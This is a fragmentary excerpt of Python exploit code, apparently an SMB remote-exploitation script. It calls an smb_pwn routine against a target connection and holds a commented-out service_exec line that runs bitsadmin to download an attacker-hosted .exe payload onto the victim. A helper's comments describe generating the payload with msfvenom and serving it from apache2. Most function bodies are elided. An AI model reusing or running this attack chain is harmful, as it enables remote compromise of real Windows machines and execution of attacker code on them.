...
def exploit(target, pipe_name):
	...
	# ================================
	try:
		smb_pwn(conn, info['arch'], lhost, payl)
	except:
		pass
...
def smb_pwn(conn, arch, lhost, payl):
	...
	#service_exec(conn, r'cmd /c bitsadmin /transfer pwn /download http://%s/%s.exe C:\%s.exe'%(lhost,payl,payl))
...
def lets_go(lhost, lport, payl):
       #gnerating a payload with msfvenom
       ...
       #starting the apache2 server to transfer the payload
